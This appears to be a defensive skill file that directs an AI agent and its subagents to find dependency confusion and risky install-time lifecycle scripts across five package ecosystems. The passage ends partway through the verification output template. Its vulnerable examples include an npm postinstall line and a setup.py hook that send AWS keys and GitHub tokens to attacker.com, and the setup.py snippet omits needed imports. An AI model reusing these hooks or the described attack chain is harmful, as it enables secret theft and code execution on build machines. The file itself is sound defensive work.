---
name: sast-depconfusion
description: >-
  Detect dependency confusion vulnerabilities where internal package names are resolvable from public
  registries (npm, PyPI, RubyGems, Maven/Gradle, NuGet) due to absent registry scoping or allowlisting,
  and lifecycle scripts (postinstall, prepare, preinstall, setup.py) in dependencies that execute
  arbitrary code at install time. Uses a three-phase approach: recon (find all manifest files and
  registry configuration, identify unscoped internal-looking package names and lifecycle scripts),
  batched verify (determine in parallel whether each candidate lacks a private-registry lock that
  prevents public resolution, 3 candidates each), and merge (consolidate batch results into
  sast/depconfusion-results.md and sast/depconfusion-results.json). Covers npm/pnpm/yarn, PyPI/pip,
  RubyGems, Maven/Gradle, and NuGet. Requires sast/architecture.md (run sast-analysis first).
  Outputs findings to sast/depconfusion-results.md and sast/depconfusion-results.json. Use when
  asked to find dependency confusion, supply-chain hijacking, namespace confusion, or CWE-427 issues.
version: 0.1.0
---

# Dependency Confusion Detection

You are performing a focused security assessment to find dependency confusion vulnerabilities — attack vectors where an internal (private) package name can be resolved from a public registry because private registry scoping or allowlisting is absent or misconfigured. This skill also detects lifecycle scripts (`postinstall`, `prepare`, `preinstall`, or equivalent) in dependencies that execute arbitrary code at install time, which is the direct exploitation path once confusion succeeds. This skill uses a three-phase approach with subagents: **recon** (find every manifest file, registry configuration file, and dependency with a suspect name or lifecycle script), **batched verify** (determine in parallel whether each candidate is truly unprotected from public resolution), and **merge** (consolidate batch reports into `sast/depconfusion-results.md` and `sast/depconfusion-results.json`).

**Prerequisites**: `sast/architecture.md` must exist. Run the analysis skill first if it doesn't.

---

## What is Dependency Confusion

A dependency confusion attack (also called a namespace confusion or substitution attack) exploits the way package managers resolve package names when both a private internal registry and the public registry are configured. If an attacker registers a package on the public registry (npm, PyPI, RubyGems, Maven Central, NuGet.org) with the same name as an internal private package, and the package manager is configured to check the public registry at all, the attacker's higher-version package wins — and its `postinstall` or equivalent lifecycle script runs arbitrary code on every developer machine, CI/CD runner, and production build host that installs dependencies.

The attack chain:

1. Attacker discovers internal package names (from GitHub leaks, job postings, error messages, or open-source code).
2. Attacker publishes a malicious package with the same name to the public registry at a high version number (e.g., `999.0.0`).
3. A developer or CI pipeline runs `npm install` / `pip install -r requirements.txt` / `bundle install`.
4. Because the public registry is consulted without a strict private-only lock, the package manager resolves the attacker's version as the newest and installs it.
5. The malicious `postinstall` script runs immediately, achieving **Remote Code Execution at install time** — exfiltrating build secrets (`AWS_ACCESS_KEY_ID`, `NPM_TOKEN`, `GITHUB_TOKEN`), installing backdoors, or corrupting build artifacts.

The core pattern: *a package dependency uses an unscoped name that could exist on the public registry, and the registry configuration does not strictly prevent public-registry resolution for that name.*

### What Dependency Confusion IS

**npm / pnpm / yarn**:
- Unscoped package names (not prefixed with `@company/`) in `package.json` `dependencies` or `devDependencies` that appear to be internal tools, monorepo packages, or company-specific utilities
- `.npmrc` missing a `@scope:registry=` entry that pins internal packages to a private registry
- `.npmrc` present but using `registry=https://registry.npmjs.org/` (public default) as the only configured registry
- `postinstall`, `preinstall`, or `prepare` scripts in `package.json` of any direct or transitive dependency (`node_modules/<pkg>/package.json`) that execute shell commands
- `pnpm` workspaces with internal packages referenced without workspace protocols (`workspace:*`) in downstream packages
- `yarn` with `resolutions` or `.yarnrc.yml` without `npmRegistries` or `npmScopes` pointing to a private registry

**PyPI / pip**:
- Package names in `requirements.txt`, `pyproject.toml` `[project].dependencies` or `[tool.poetry.dependencies]`, or `setup.cfg` `install_requires` that do not have a hash pin (`--require-hashes`) or an explicit `--index-url` pointing to an internal PyPI mirror
- `pip.conf` / `pip.ini` missing `index-url = https://internal.pypi.company.com/` or containing `extra-index-url` pointing to the public PyPI alongside internal packages (the public fallback is the attack surface)
- `setup.py` or `pyproject.toml` build hooks using `subprocess` or `os.system` calls in `cmdclass` overrides, `entry_points`, or `build_backend` hooks
- Package names matching internal naming conventions (`company-*`, `internal-*`, `corp-*`, project name prefixes)

**RubyGems**:
- `Gemfile` gems without an explicit `source:` block or `:source =>` argument pointing to a private gem server
- Top-level `source 'https://rubygems.org'` in `Gemfile` with no `gemspec` or per-gem source override for internal gems
- Gems with `gemspec` files containing `spec.post_install_message` combined with executable scripts
- No `Gemfile.lock` entries that pin gem versions to a private source

**Maven / Gradle**:
- `pom.xml` or `build.gradle` artifact IDs that match internal naming conventions resolved from Maven Central (`https://repo.maven.apache.org/maven2/`) without a checksum verification policy
- `settings.xml` / `gradle.properties` that list an internal Nexus/Artifactory mirror but also leave Maven Central as a fallback repository
- `<repositories>` or `repositories {}` blocks in build files that include `mavenCentral()` alongside internal repositories
- `distributionManagement` in `pom.xml` pointing to internal Nexus but with no `<mirrorOf>*</mirrorOf>` enforcement blocking external resolution
- Gradle `buildSrc` or plugin `build.gradle` files that resolve from `gradlePluginPortal()` for internal plugin names

**NuGet**:
- Package IDs matching internal names in `*.csproj`, `packages.config`, or `Directory.Packages.props` without a `NuGet.config` that has a `<packageSources>` entry with `<clear />` before listing only the internal feed
- `NuGet.config` that lists `https://api.nuget.org/v3/index.json` alongside internal feeds without disabling the public feed for internal package names
- `paket.lock` or `paket.dependencies` with dependencies resolved from `nuget` (public) rather than from a private source override

### What Dependency Confusion is NOT

Do not flag these patterns:

- **Properly scoped npm packages**: `"@company/internal-utils": "^1.0.0"` with `.npmrc` containing `@company:registry=https://npm.internal.company.com/` and `registry=https://npm.internal.company.com/` as the **only** (non-public) registry — both conditions must hold
- **PyPI with `--require-hashes`**: A `requirements.txt` that specifies every package with a `--hash=sha256:...` suffix and is installed with `pip install --require-hashes -r requirements.txt` — hash pinning prevents substitution even if the public registry is consulted
- **PyPI with `index-url` and no `extra-index-url` pointing to public PyPI**: `pip.conf` setting `index-url = https://pypi.internal.company.com/` with no public PyPI extra-index-url — if the internal mirror is comprehensive, no public fallback exists
- **RubyGems with per-gem `source:`**: `gem 'internal-gem', source: 'https://gems.internal.company.com/'` — explicit source annotation prevents public resolution for that gem
- **Maven with `<mirrorOf>*</mirrorOf>` in settings.xml**: A mirror configuration that routes ALL requests to internal Nexus/Artifactory with no Central fallback
- **NuGet with `<clear />`**: A `NuGet.config` where `<packageSources>` begins with `<clear />` followed only by the internal feed — this disables all public feeds before adding the private one
- **`postinstall` scripts in well-known widely-used packages that are security-team-reviewed**: If the project has a documented allowlist of approved packages with lifecycle scripts, and the specific package appears on that allowlist — flag it as Needs Manual Review, not Vulnerable, with a note to verify the allowlist
- **Lock file with integrity field and verified signature**: `package-lock.json` or `yarn.lock` entries that include `integrity: sha512-...` **and** the project CI verifies signatures via `npm audit signatures` or `pnpm install --frozen-lockfile` — the integrity pin prevents version substitution

### Patterns That Prevent Dependency Confusion

When you see the following combinations, the project is likely protected for that ecosystem:

**1. npm — scoped packages + private registry (fully protected)**
```ini
# .npmrc (project-level)
@company:registry=https://npm.internal.company.com/
//npm.internal.company.com/:_authToken=${NPM_INTERNAL_TOKEN}
```
```json
// package.json — all internal packages are scoped
{
  "dependencies": {
    "@company/internal-utils": "^2.1.0",
    "@company/auth-client": "^1.0.0"
  }
}
```
Both conditions must hold: the package is scoped AND the `.npmrc` maps that scope to the internal registry with no public fallback for that scope.

**2. npm — Verdaccio / Nexus with `registry=` set to internal-only**
```ini
# .npmrc — single registry pointing to internal mirror that proxies public packages
registry=https://registry.internal.company.com/
```
This is safe ONLY IF the internal mirror does NOT proxy public packages for the internal package names (i.e., internal packages do not exist on the public registry).

**3. PyPI — strict hash pinning**
```
# requirements.txt with --require-hashes
internal-analytics==3.2.1 \
    --hash=sha256:a1b2c3d4e5f6...abc \
    --hash=sha256:b2c3d4e5f6a1...def
```
If installed via `pip install --require-hashes -r requirements.txt`, the hash comparison prevents a substitute package from being accepted even if pip resolves the wrong source.

**4. PyPI — `pip.conf` with `index-url` only (no public fallback)**
```ini
[global]
index-url = https://pypi.internal.company.com/simple/
# no extra-index-url entry
```

**5. NuGet — `<clear />` in NuGet.config**
```xml
<configuration>
  <packageSources>
    <clear />
    <add key="InternalFeed" value="https://nuget.internal.company.com/v3/index.json" />
  </packageSources>
</configuration>
```
The `<clear />` element removes all inherited sources (including nuget.org), then only the internal feed is added.

**6. Maven — mirror blocking external resolution**
```xml
<!-- settings.xml -->
<mirrors>
  <mirror>
    <id>internal-nexus</id>
    <url>https://nexus.internal.company.com/repository/maven-public/</url>
    <mirrorOf>*</mirrorOf>  <!-- blocks ALL repositories — public and private — redirects to Nexus -->
  </mirror>
</mirrors>
```

---

## Vulnerable vs. Secure Examples

### npm — Unscoped internal package with public registry fallback

```jsonc
// VULNERABLE: package.json — "internal-utils" is unscoped and could be registered on npmjs.com
{
  "name": "company-web-app",
  "dependencies": {
    "react": "^18.2.0",
    "express": "^4.18.2",
    "internal-utils": "^1.0.0",       // VULNERABLE: unscoped, internal-looking name
    "corp-auth-client": "^3.1.0",     // VULNERABLE: unscoped internal name
    "company-design-system": "^2.0.0" // VULNERABLE: unscoped internal name
  }
}
```

```ini
# VULNERABLE: .npmrc — public registry is the only configured source
# No @scope:registry= entry; all packages resolve from the public npm registry
registry=https://registry.npmjs.org/
```

```jsonc
// SECURE: package.json — all internal packages are scoped under @company/
{
  "name": "company-web-app",
  "dependencies": {
    "react": "^18.2.0",
    "express": "^4.18.2",
    "@company/internal-utils": "^1.0.0",       // SECURE: scoped
    "@company/auth-client": "^3.1.0",          // SECURE: scoped
    "@company/design-system": "^2.0.0"         // SECURE: scoped
  }
}
```

```ini
# SECURE: .npmrc — scope pinned to private registry; no public fallback for @company/ packages
@company:registry=https://npm.internal.company.com/
//npm.internal.company.com/:_authToken=${NPM_INTERNAL_TOKEN}
```

### npm — postinstall script in a dependency

```jsonc
// VULNERABLE: node_modules/internal-analytics/package.json
// A postinstall script that runs on every install — if this package is the attacker's
// version, this script exfiltrates build secrets to an external server
{
  "name": "internal-analytics",
  "version": "999.0.0",
  "scripts": {
    "postinstall": "node -e \"require('https').request('https://attacker.com/exfil?d='+process.env.AWS_ACCESS_KEY_ID+process.env.GITHUB_TOKEN).end()\""
  }
}
```

```jsonc
// VULNERABLE: a legitimate-looking postinstall in a dependency that deserves review
// because the package name is unscoped and the postinstall runs shell commands
{
  "name": "corp-build-tools",
  "version": "2.3.0",
  "scripts": {
    "postinstall": "node scripts/post-install.js"  // executes arbitrary code at install time
  }
}
```

### PyPI — package without hash pin or private index

```
# VULNERABLE: requirements.txt — packages installed from the public PyPI
# An attacker can publish internal-analytics==999.0.0 to pypi.org
internal-analytics==3.2.1
company-data-utils==1.0.5
corp-ml-pipeline==2.1.0

# VULNERABLE: extra-index-url creates a public fallback even if index-url is internal
# pip checks BOTH sources and takes the highest version
--index-url https://pypi.internal.company.com/simple/
--extra-index-url https://pypi.org/simple/
internal-analytics==3.2.1

# SECURE: strict hash pinning prevents substitution even if pip consults pypi.org
internal-analytics==3.2.1 \
    --hash=sha256:4b4f77f8b3c9d1e5a2...abc123def456 \
    --hash=sha256:9e3c1f2a5b6d8e7f0...fff000111222
```

```ini
# VULNERABLE: pip.conf — extra-index-url adds public PyPI as a fallback
[global]
index-url = https://pypi.internal.company.com/simple/
extra-index-url = https://pypi.org/simple/
# The public fallback means pip resolves from pypi.org for any package it can't find internally
# — or for any package where the public version number is higher

# SECURE: pip.conf — only internal PyPI, no public fallback
[global]
index-url = https://pypi.internal.company.com/simple/
```

```python
# VULNERABLE: setup.py with a build-time command in install_requires processing
# If the package itself is the confused dependency, the setup.py runs at install time
import subprocess
from setuptools import setup

class PostInstallCommand(install):
    def run(self):
        subprocess.run(["curl", "https://attacker.com/beacon", "-d", os.environ.get("AWS_SECRET_ACCESS_KEY", "")])
        install.run(self)
```

### RubyGems — gem without explicit private source

```ruby
# VULNERABLE: Gemfile — all gems resolve from rubygems.org by default
# An attacker can publish internal-auth==999.0.0 to rubygems.org
source 'https://rubygems.org'

gem 'rails', '~> 7.1'
gem 'internal-auth', '~> 2.0'        # VULNERABLE: resolves from public rubygems.org
gem 'corp-reporting-utils', '~> 1.5' # VULNERABLE: resolves from public rubygems.org

# SECURE: per-gem explicit source for internal gems
source 'https://rubygems.org'

gem 'rails', '~> 7.1'
gem 'internal-auth', '~> 2.0', source: 'https://gems.internal.company.com/'        # SECURE
gem 'corp-reporting-utils', '~> 1.5', source: 'https://gems.internal.company.com/' # SECURE
```

### Maven / Gradle — artifact resolved from Central with no mirror enforcement

```xml
<!-- VULNERABLE: pom.xml — no explicit mirror enforcement, Maven Central included -->
<project>
  <repositories>
    <repository>
      <id>internal-nexus</id>
      <url>https://nexus.internal.company.com/repository/maven-releases/</url>
    </repository>
    <!-- Maven Central is included implicitly (or explicitly) — attacker can publish
         com.company:internal-utils:999.0.0 to Maven Central -->
  </repositories>
  <dependencies>
    <dependency>
      <groupId>com.company</groupId>
      <artifactId>internal-utils</artifactId>  <!-- VULNERABLE: no mirror blocking Central -->
      <version>2.1.0</version>
    </dependency>
  </dependencies>
</project>
```

```xml
<!-- SECURE: settings.xml — all traffic routed to internal Nexus via <mirrorOf>*</mirrorOf> -->
<settings>
  <mirrors>
    <mirror>
      <id>internal-nexus-mirror</id>
      <url>https://nexus.internal.company.com/repository/maven-public/</url>
      <mirrorOf>*</mirrorOf>  <!-- SECURE: ALL repositories redirected to Nexus -->
    </mirror>
  </mirrors>
</settings>
```

```groovy
// VULNERABLE: build.gradle — mavenCentral() is listed alongside internal repository
repositories {
    maven { url 'https://nexus.internal.company.com/repository/maven-releases/' }
    mavenCentral()  // VULNERABLE: public Central is a fallback — attacker wins on version
}
```

```groovy
// SECURE: build.gradle — internal repository only, Central excluded
repositories {
    maven {
        url 'https://nexus.internal.company.com/repository/maven-public/'
        // This is a Nexus group that proxies Central internally, with no direct Central access
    }
    // No mavenCentral() or jcenter() — all resolution goes through Nexus
}
```

### NuGet — package resolved from public nuget.org

```xml
<!-- VULNERABLE: NuGet.config — nuget.org is listed alongside the internal feed
     An attacker can publish Company.Internal.Utils@999.0.0 to nuget.org -->
<configuration>
  <packageSources>
    <add key="InternalFeed" value="https://nuget.internal.company.com/v3/index.json" />
    <add key="nuget.org" value="https://api.nuget.org/v3/index.json" />  <!-- VULNERABLE -->
  </packageSources>
</configuration>
```

```xml
<!-- SECURE: NuGet.config — <clear /> removes all inherited feeds; only internal feed active -->
<configuration>
  <packageSources>
    <clear />  <!-- SECURE: removes nuget.org and all other inherited sources -->
    <add key="InternalFeed" value="https://nuget.internal.company.com/v3/index.json" />
  </packageSources>
</configuration>
```

```xml
<!-- VULNERABLE: .csproj — internal-looking package ID without NuGet.config protection -->
<ItemGroup>
  <PackageReference Include="Company.Internal.Auth" Version="3.0.0" />       <!-- VULNERABLE -->
  <PackageReference Include="Corp.DataAccess.Core" Version="1.5.2" />        <!-- VULNERABLE -->
</ItemGroup>
```

---

## Execution

This skill runs in three phases using subagents. Pass the contents of `sast/architecture.md` to all subagents as context.

### Phase 1: Recon — Find Dependency Confusion Candidates

Launch a subagent with the following instructions:

> **Goal**: Find every location in the codebase where a dependency is potentially susceptible to dependency confusion: unscoped internal-looking package names resolvable from public registries, absent or misconfigured registry locking, and lifecycle scripts in dependencies. Write results to `sast/depconfusion-recon.md`.
>
> **Context**: You will be given the project's architecture summary. Use it to understand what package ecosystems are present, what the project's company/org name is (to identify internal naming conventions), and what build tooling is used.
>
> **Step 1 — Discover the company/org naming convention**:
>
> Before searching for candidates, determine the internal package naming convention by:
> - Reading `package.json` `name` field, `setup.cfg` `name`, `pom.xml` `<groupId>`, or `Gemfile` source comments
> - Searching for patterns like `@company/`, `corp-`, `internal-`, project-name-specific prefixes, or `com.company.` groupIds
> - Reading `sast/architecture.md` for the organization name, monorepo name, or internal namespace
>
> Record the naming convention(s) you identify — you'll use these as signals to flag internal-looking package names.
>
> **Step 2 — npm / pnpm / yarn**:
>
> Search for manifest files:
> ```
> find . -name "package.json" -not -path "*/node_modules/*" -not -path "*/.git/*"
> ```
>
> For each `package.json` found, read `dependencies`, `devDependencies`, `peerDependencies`, and `optionalDependencies`. Flag any package name that:
> - Is NOT prefixed with `@` (unscoped)
> - Matches the identified internal naming pattern (company prefix, `internal-`, `corp-`, project-name-, etc.)
> - Does NOT appear to be a well-known public package (react, express, lodash, axios, etc.)
>
> Also read `scripts` in each `package.json` for `postinstall`, `preinstall`, and `prepare` entries that execute shell commands or Node scripts.
>
> Search for registry configuration:
> ```
> find . -name ".npmrc" -o -name ".yarnrc" -o -name ".yarnrc.yml" -not -path "*/node_modules/*"
> ```
>
> For each `.npmrc` found, check:
> - Is there a `@scope:registry=` entry for any internal scope?
> - Is the `registry=` line set to a public registry (npmjs.org) or an internal one?
> - Is there a `//registry.npmjs.org/:_authToken=` line (indicates public registry auth — not a private lock)?
>
> Search for `postinstall` scripts in already-installed dependencies (if `node_modules/` exists):
> ```
> grep -r '"postinstall"' node_modules/*/package.json --include="package.json" -l 2>/dev/null | head -20
> grep -r '"preinstall"' node_modules/*/package.json --include="package.json" -l 2>/dev/null | head -20
> grep -r '"prepare"' node_modules/*/package.json --include="package.json" -l 2>/dev/null | head -20
> ```
>
> **Step 3 — PyPI / pip**:
>
> Search for manifest files:
> ```
> find . -name "requirements*.txt" -o -name "pyproject.toml" -o -name "setup.py" -o -name "setup.cfg" -o -name "Pipfile" -not -path "*/.git/*"
> ```
>
> For each file, extract package names. Flag any package name that:
> - Matches the internal naming convention identified in Step 1
> - Is listed WITHOUT a `--hash=sha256:...` pin (in `requirements.txt`)
> - Is listed in `pyproject.toml` or `setup.cfg` without a corresponding hash-verified lock
>
> Search for pip configuration:
> ```
> find . -name "pip.conf" -o -name "pip.ini" -not -path "*/.git/*"
> find ~/.pip -name "pip.conf" -o -name "pip.ini" 2>/dev/null
> find /etc -name "pip.conf" 2>/dev/null
> ```
>
> For each pip config found, check:
> - Is `index-url` set to an internal PyPI?
> - Is `extra-index-url` present and pointing to the public `https://pypi.org/simple/`?
>
> Search for `pyproject.toml` build backends with install hooks:
> ```
> grep -r "post_install\|install_requires\|subprocess\|os.system" --include="setup.py" . 2>/dev/null
> ```
>
> **Step 4 — RubyGems**:
>
> Search for manifest files:
> ```
> find . -name "Gemfile" -o -name "*.gemspec" -not -path "*/.git/*"
> ```
>
> For each `Gemfile`, check:
> - Is there a top-level `source 'https://rubygems.org'`?
> - Are any gems that match the internal naming convention listed WITHOUT `:source =>` or `source:` pointing to a private gem server?
>
> **Step 5 — Maven / Gradle**:
>
> Search for build files:
> ```
> find . -name "pom.xml" -o -name "build.gradle" -o -name "build.gradle.kts" -o -name "settings.gradle" -not -path "*/.git/*"
> ```
>
> Also search for Maven settings:
> ```
> find . -name "settings.xml" -not -path "*/.git/*"
> find ~/.m2 -name "settings.xml" 2>/dev/null
> ```
>
> For each build file, flag:
> - `pom.xml` artifact IDs matching the internal naming convention with `mavenCentral()` or an implicit Central fallback
> - `build.gradle` with `mavenCentral()` or `jcenter()` alongside internal repositories
> - `settings.xml` where no `<mirror>` with `<mirrorOf>*</mirrorOf>` is present
>
> **Step 6 — NuGet**:
>
> Search for package files:
> ```
> find . -name "*.csproj" -o -name "packages.config" -o -name "NuGet.config" -o -name "Directory.Packages.props" -not -path "*/.git/*"
> ```
>
> For each `NuGet.config`, check:
> - Is `<clear />` the first entry in `<packageSources>`?
> - Is `https://api.nuget.org/v3/index.json` listed as a source?
>
> For each `.csproj` or `packages.config`, flag `PackageReference` or `package` entries with IDs matching the internal naming convention.
>
> **What to skip** (these are safe — do not flag):
> - Scoped npm packages (`@scope/name`) where `.npmrc` contains a matching `@scope:registry=` pointing to an internal registry
> - PyPI packages with complete hash pins AND installed with `--require-hashes`
> - NuGet configs where `<clear />` precedes all source entries
> - Maven projects where `settings.xml` has a catch-all mirror (`<mirrorOf>*</mirrorOf>`)
> - Well-known public packages: react, express, django, flask, rails, spring, lodash, axios, etc.
>
> **Output format** — write to `sast/depconfusion-recon.md`:
>
> ```markdown
> # Dependency Confusion Recon: [Project Name]
>
> ## Summary
> Found [N] dependency confusion candidates across [ecosystems].
>
> ## Internal Naming Convention Detected
> - Company/org prefix: [e.g., `@acme/`, `acme-`, `com.acme.`]
> - Evidence: [where you found this — package.json name, groupId, etc.]
>
> ## Candidates
>
> ### 1. [Descriptive name — e.g., "Unscoped internal package 'corp-auth-client' in package.json"]
> - **Ecosystem**: npm | PyPI | RubyGems | Maven | NuGet
> - **File**: `path/to/manifest/file` (line X)
> - **Package name**: [the full package name / ID]
> - **Declared version**: [e.g., `^1.0.0` or `3.2.1`]
> - **Issue type**: unscoped-internal | missing-registry-lock | lifecycle-script | public-fallback
> - **Registry config file**: [path to .npmrc / pip.conf / NuGet.config / settings.xml, or "none found"]
> - **Registry config status**: [e.g., "no .npmrc found" / ".npmrc present but no @scope:registry" / "pip.conf has extra-index-url pointing to public PyPI"]
> - **Lifecycle script**: [yes: `"postinstall": "node scripts/install.js"` / no]
> - **Code snippet**:
>   ```
>   [the relevant line(s) from the manifest or registry config]
>   ```
> - **Note**: [any additional context]
>
> [Repeat for each candidate]
>
> ## Registry Configuration Files Found
> [List all .npmrc, pip.conf, NuGet.config, settings.xml files found with their key settings]
> ```

### After Phase 1: Check for Candidates Before Proceeding

After Phase 1 completes, read `sast/depconfusion-recon.md`. If the recon found **zero candidates** (the summary reports "Found 0" or the "Candidates" section is empty or absent), **skip Phase 2 entirely**. Instead, write the following content to both output files and stop:

```markdown
# Dependency Confusion Analysis Results

No vulnerabilities found.
```

```json
{
  "findings": []
}
```

Write the markdown to `sast/depconfusion-results.md` and the JSON to `sast/depconfusion-results.json`.

Only proceed to Phase 2 if Phase 1 found at least one candidate.

### Phase 2: Verify — Registry Lock and Public Reachability Analysis (Batched)

After Phase 1 completes, read `sast/depconfusion-recon.md` and split the candidates into **batches of up to 3 candidates each**. Launch **one subagent per batch in parallel**. Each subagent determines whether each candidate is truly at risk and writes results to its own batch file.

**Batching procedure** (you, the orchestrator, do this — not a subagent):

1. Read `sast/depconfusion-recon.md` and count the numbered candidate sections under "Candidates" (### 1., ### 2., etc.).
2. Divide them into batches of up to 3. For example, 7 candidates → 3 batches (1-3, 4-6, 7).
3. For each batch, extract the full text of those candidate sections from the recon file, including the "Registry Configuration Files Found" section.
4. Launch all batch subagents **in parallel**, passing each one only its assigned candidates plus the registry config section.
5. Each subagent writes to `sast/depconfusion-batch-N.md` where N is the 1-based batch number.
6. Pass the "Registry Configuration Files Found" section to every subagent — they need it to assess protection status.

Give each batch subagent the following instructions (substitute the batch-specific values):

> **Goal**: For each assigned dependency confusion candidate, determine whether the package is truly at risk of being resolved from a public registry, and assess the actual risk including lifecycle script execution. Write results to `sast/depconfusion-batch-[N].md`.
>
> **Your assigned candidates** (from the recon phase):
>
> [Paste the full text of the assigned candidate sections here, preserving the original numbering, plus the full "Registry Configuration Files Found" section]
>
> **Context**: You will be given the project's architecture summary. Use it to understand the organization's package ecosystem and build tooling.
>
> **Verify question for each candidate**: Does the package name appear resolvable from the public registry? Is there no registry lock that strictly prevents public resolution? Does any dependency include a lifecycle script that would execute at install time?
>
> **For each candidate, answer these questions in order**:
>
> **Question 1 (npm): Does a strict private-registry lock exist for this package's scope or name?**
>
> Read the registry configuration files identified in the recon. For npm packages, verify:
>
> a. If the package is scoped (`@scope/name`): Is there a `@scope:registry=https://internal.registry.com/` entry in `.npmrc`? If yes, AND no public npm registry is set as a fallback for that scope → **registry lock present**.
>
> b. If the package is unscoped (`name-without-at-prefix`): Does `.npmrc` set `registry=https://internal.registry.com/` (non-public URL) as the ONLY registry? If yes, AND the internal registry does NOT proxy the public npm registry for this specific package name → **partial protection** (requires verifying the internal registry is truly isolated). If `.npmrc` is absent or `registry=https://registry.npmjs.org/`, → **no lock, vulnerable**.
>
> c. Check if the `package-lock.json` / `yarn.lock` / `pnpm-lock.yaml` contains an `integrity` field AND the CI pipeline runs `npm ci` (which enforces the lock file) — if both are true, a new version can't be injected without modifying the lock file; this reduces exploitability to `conditional`.
>
> **Question 1 (PyPI): Is the package hash-pinned or is the index URL strictly internal?**
>
> a. Does the `requirements.txt` include `--hash=sha256:...` for this package? AND is it installed via `pip install --require-hashes`? If both → **hash-pinned, protected**.
>
> b. Does `pip.conf` set `index-url` to an internal PyPI mirror? AND is there NO `extra-index-url` pointing to `pypi.org`? If both → **registry lock present** (but still flag if you cannot verify the internal mirror doesn't proxy public packages for this name).
>
> c. If `extra-index-url = https://pypi.org/simple/` is present AND the package is internal-looking → **vulnerable** (pip resolves the highest version across all indexes).
>
> **Question 1 (RubyGems): Is there a per-gem source override?**
>
> Does the gem have `:source =>` or `source:` in the `Gemfile` pointing to a private gem server? If yes → **protected for this gem**. If only the top-level `source 'https://rubygems.org'` is present with no gem-level override → **vulnerable**.
>
> **Question 1 (Maven/Gradle): Is Maven Central blocked by a catch-all mirror?**
>
> Does `settings.xml` contain a `<mirror>` with `<mirrorOf>*</mirrorOf>` routing ALL requests to an internal Nexus/Artifactory? If yes → **registry lock present** (still check if Nexus exposes a public proxy group). If `mavenCentral()` or `jcenter()` is listed in `build.gradle` or `<repositories>` in `pom.xml` without a mirror overriding it → **vulnerable**.
>
> **Question 1 (NuGet): Does NuGet.config start with `<clear />`?**
>
> Does the relevant `NuGet.config` contain `<clear />` as the first element in `<packageSources>`? If yes → **public feeds disabled, protected**. If nuget.org is listed alongside internal feeds without a `<clear />` → **vulnerable**.
>
> **Question 2: Is this a lifecycle script in a devDependency only?**
>
> If the candidate is a `devDependencies` package with a lifecycle script and there is clear evidence the package is never installed in production builds (CI pipeline uses `npm install --omit=dev` or `npm ci --omit=dev`), set `exploitability: conditional` and reduce severity from critical to high.
>
> If the candidate is in `dependencies` (production) → lifecycle scripts always run, `exploitability: reachable`, severity: `critical`.
>
> **Question 3: Can the internal package name be registered on the public registry?**
>
> This is a theoretical check — you cannot actually query the public registry, but you can assess likelihood:
>
> - Unscoped names (npm) are registerable on npmjs.com by anyone
> - PyPI names are registerable by anyone who creates a free account
> - RubyGems names are registerable by anyone
> - Maven Central artifact IDs under a non-verified groupId are registerable
> - NuGet package IDs are registerable by anyone
>
> For scoped npm packages where the scope is NOT owned by the company (e.g., `@internal/pkg` where `@internal` is not a claimed npmjs.com organization), the scope itself can be registered → `exploitability: reachable`.
>
> **FP-killers** (patterns that confirm the candidate is NOT a real vulnerability):
>
> 1. `.npmrc` has BOTH `@scope:registry=https://internal.registry/` AND the lock file's `resolved` URL field points to the internal registry for this package — the lock file proves the package was last resolved from the internal source
> 2. `pip.conf` sets `index-url` to an internal PyPI with no `extra-index-url` — single source, no public fallback
> 3. `NuGet.config` starts with `<clear />` — nuget.org is explicitly removed
> 4. Maven `settings.xml` has `<mirrorOf>*</mirrorOf>` pointing to Nexus — all traffic is routed internally
> 5. The package in question is a well-known public package that only superficially matches the internal naming pattern — e.g., `company-name` is a common English word, not a proprietary prefix
> 6. The `postinstall` script in a dependency is from a well-known, widely-vetted open-source package (eslint, husky, node-gyp) and not an internal-named package
>
> **exploitability / confidence rules**:
>
> - `exploitability: reachable` — unscoped internal name with no registry lock, OR lifecycle script in a production dependency with no registry lock
> - `exploitability: conditional` — registry lock exists but is incomplete (e.g., lock file with integrity but no `npm ci` enforcement; or internal PyPI exists but `extra-index-url` creates a public fallback for non-cached packages); OR lifecycle script only in devDependency installed with `--omit=dev` in production
> - `exploitability: unreachable` — use sparingly; requires both a strong registry lock AND confirmed evidence it works in production CI (e.g., `npm ci` in CI logs, `pip install --require-hashes` in Dockerfile)
> - `confidence: high` — unscoped internal-looking name with only public registry configured; OR no registry config file found at all
> - `confidence: medium` — naming convention must be inferred (package name matches patterns but no definitive internal-name evidence); OR registry config exists but is incomplete
> - `confidence: low` — package name is ambiguous (could be internal or a generic public package); OR registry config protects most but not all paths
>
> **chain_id rules**:
>
> - If the candidate includes a lifecycle script AND the package is unprotected from public resolution: set `chain_id: "dep-confusion-rce"` (chains with `sast-rce`)
> - If the candidate includes a lifecycle script that plausibly exfiltrates environment variables or build secrets: set `chain_id: "dep-confusion-secret-exfil"` (chains with `sast-hardcodedsecrets`)
> - If the candidate has no lifecycle script but could be substituted with a malicious version that introduces backdoor code: set `chain_id: null` but note the RCE risk in the description
> - If both a lifecycle script AND a hardcoded secret are present in the same context: prefer `chain_id: "dep-confusion-secret-exfil"`
>
> **Severity rules**:
>
> - `critical` — unscoped internal package with no registry lock AND the package (or a substitute) has a `postinstall`/`preinstall`/`prepare` script; supply-chain RCE at install time
> - `high` — unscoped internal package with no registry lock but no lifecycle script; attacker can substitute the package with malicious code but RCE requires a subsequent code execution trigger (import, function call)
> - `medium` — package is a devDependency only with no lifecycle script and production builds use `--omit=dev`; risk is limited to developer machines and CI environments
> - `low` — registry config partially protects the package but has an ambiguous gap; requires confirmation that the gap is exploitable
>
> **Classification**:
> - **Vulnerable**: No registry lock; internal-looking package name resolvable from public registry; `exploitability: reachable`
> - **Likely Vulnerable**: Registry config present but incomplete (e.g., `extra-index-url` public fallback, or lock file without `npm ci` enforcement); `exploitability: conditional`
> - **Not Vulnerable**: Strong registry lock confirmed (e.g., `<clear />` in NuGet.config, `--require-hashes` with `pip install`, `@scope:registry=` with no public fallback and lock file pointing to internal resolved URL)
> - **Needs Manual Review**: Registry config exists but cannot confirm it prevents public-registry resolution for this specific package name without querying the internal registry
>
> **Output format** — write to `sast/depconfusion-batch-[N].md`:
>
> ```markdown
> # Dependency Confusion Batch [N] Results
>
> ## Findings
>
> ### [VULNERABLE] Descriptive name
> - **File**: `path/to/manifest/file` (line X)
> - **Ecosystem**: npm | PyPI | RubyGems | Maven | NuGet
> - **Package name**: [full package name]
> - **Declared version**: [version range or pin]
> - **Issue**: [e.g., "Unscoped package 'corp-auth-client' declared in package.json with no .npmrc registry lock; any attacker can register this name on npmjs.com with a higher version number"]
> - **Lifecycle script**: [yes: script body | no]
